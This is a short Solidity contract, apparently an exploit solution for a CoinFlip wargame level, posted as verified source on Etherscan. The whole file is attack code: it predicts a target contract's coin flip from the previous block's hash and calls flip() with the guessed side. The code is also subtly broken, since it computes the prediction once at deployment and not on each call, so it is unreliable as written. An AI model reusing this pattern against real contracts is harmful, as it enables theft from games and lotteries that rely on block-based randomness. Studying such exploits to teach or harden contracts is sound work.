/**
 *Submitted for verification at Etherscan.io on 2021-10-12
*/

pragma solidity ^0.8.0;

interface CoinFlip{
         function flip(bool _guess) external returns (bool);
    }

contract CoinFlipHack {
   CoinFlip public immutable Coin;
    constructor(address CoinflipAddress) {
        Coin = CoinFlip(CoinflipAddress);
    }
    
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 public blockValue = uint256(blockhash(block.number-1));
        uint256 public coinFlip = blockValue/FACTOR;
        
        function CoinWin() public {
                bool side = coinFlip == 1 ? true : false;
                Coin.flip(side);
            
        }

}